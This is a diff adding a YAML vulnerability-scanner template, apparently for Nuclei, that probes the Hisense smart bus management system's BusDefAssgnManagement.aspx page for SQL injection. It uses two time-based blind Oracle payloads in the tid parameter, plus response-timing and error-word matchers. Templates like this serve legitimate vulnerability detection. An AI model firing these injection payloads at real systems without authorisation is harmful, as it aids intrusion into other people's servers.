@@ -1,0 +1,29 @@
+id: poc-yaml-hisense-transtech-busdefassgnmanagement-aspx-sqli
+info:
+  name: 海信智能公交企业管理系统 BusDefAssgnManagement.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 海信智能公交企业管理系统
+
+http:
+  - method: GET
+    path:
+      - "/YZSoft/Forms/XForm/BM/MaintainceManagement/BusDefAssgnManagement.aspx?tid=1+AND+3536=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(101)||CHR(88)||CHR(83),5)--+c"
+      - "/YZSoft/Forms/XForm/BM/MaintainceManagement/BusDefAssgnManagement.aspx?tid=1+AND+3536=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(101)||CHR(88)||CHR(83),8)--+c"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Error Report"
+          - "StringToNumber"
+          - "SQL"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
